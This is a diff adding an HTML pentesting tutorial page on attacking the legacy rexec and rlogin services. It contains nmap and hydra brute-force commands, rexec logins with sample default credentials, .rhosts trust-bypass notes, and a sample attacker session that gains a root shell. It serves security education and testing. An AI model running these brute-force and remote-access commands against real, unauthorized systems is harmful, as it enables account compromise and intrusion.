@@ -1,0 +1,172 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Rexec & Rlogin Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Remote Access</strong> • Focus: <strong>r-commands Abuse & Remote Shell Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Rexec (TCP/512) and Rlogin (TCP/513) are part of the Berkeley r-commands suite, 
+    once used for remote command execution and login to Unix/Linux systems. 
+    Both are insecure: rexec transmits credentials in plaintext, while rlogin 
+    often relies on trust-based authentication via <code>.rhosts</code> files. 
+    Attackers exploit these protocols to brute force accounts, sniff credentials, 
+    or bypass authentication entirely. If mapped to privileged users, 
+    they can lead to full system compromise.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Plaintext Transmission:</strong> Usernames/passwords (rexec) and sessions (rlogin) sent unencrypted.</li>
+    <li><strong>Weak Authentication:</strong> Default/trusted accounts often left enabled.</li>
+    <li><strong>.rhosts Abuse:</strong> rlogin trusts remote hosts defined in <code>.rhosts</code> or <code>/etc/hosts.equiv</code>.</li>
+    <li><strong>Legacy Systems:</strong> Still found in old Unix/industrial environments.</li>
+    <li><strong>Direct Shell Access:</strong> Exploitation gives attacker command execution.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify rexec (TCP/512) or rlogin (TCP/513).</li>
+    <li><strong>Authentication:</strong> Brute force plaintext creds (rexec) or abuse trust configs (rlogin).</li>
+    <li><strong>Exploitation:</strong> Execute remote commands (rexec) or open interactive sessions (rlogin).</li>
+    <li><strong>Impact:</strong> Lateral movement, privilege escalation, sensitive data theft.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for TCP/512 (rexec) and TCP/513 (rlogin).</li>
+    <li>Attempt authentication (brute force, sniffed creds, or trust bypass).</li>
+    <li>Execute commands (rexec) or open sessions (rlogin).</li>
+    <li>Escalate privileges via SUID binaries or pivot further inside network.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p512,513 --script rexec-brute,rexec-info,rlogin-brute [target]
+
+# ------------------------------
+# Rexec Usage
+# ------------------------------
+rexec -l user -p password [target] "id"
+rexec -l root -p root123 [target] "uname -a"
+
+# ------------------------------
+# Rlogin Usage
+# ------------------------------
+rlogin [target] -l user
+# If .rhosts trusts our IP/user, no password needed
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -L users.txt -P passwords.txt rexec://[target]
+hydra -L users.txt -P passwords.txt rlogin://[target]
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p512,513 192.168.1.180
+rexec -l admin -p Summer2025! 192.168.1.180 "whoami"
+rlogin 192.168.1.180 -l admin
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p512,513 --script rexec-info,rlogin-info 192.168.1.180
+PORT    STATE SERVICE
+512/tcp open  exec
+513/tcp open  login
+
+[ saide ~ ]$ rexec -l admin -p Summer2025! 192.168.1.180 "whoami"
+admin
+
+[ saide ~ ]$ rexec -l root -p root123 192.168.1.180 "id"
+uid=0(root) gid=0(root) groups=0(root)
+
+[ saide ~ ]$ rlogin 192.168.1.180 -l admin
+Last login: Fri Sep  5 10:44:31 from attacker
+SunOS legacybox 5.10 Generic_147148-26 sun4v sparc
+
+admin@legacybox:~$ whoami
+admin
+
+[+] Interactive shell obtained via rlogin
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample rexec & rlogin exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+512/tcp open  exec (rexec)
+513/tcp open  login (rlogin)
+
+# Weak Credentials
+rexec → root:root123
+rlogin → trust bypass via .rhosts
+
+# Exploitation
+Rexec → Remote commands executed as root
+Rlogin → Interactive shell without password
+
+# Proof of Exploitation
+whoami → root
+uname -a → SunOS legacybox 5.10
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rexec-rlogin-rsh" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting rexec/rlogin/rsh
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1021/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Remote Services
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Brute creds / trust abuse → Remote execution → Pivot → Privilege escalation.</li>
+  </ul>
+</section>
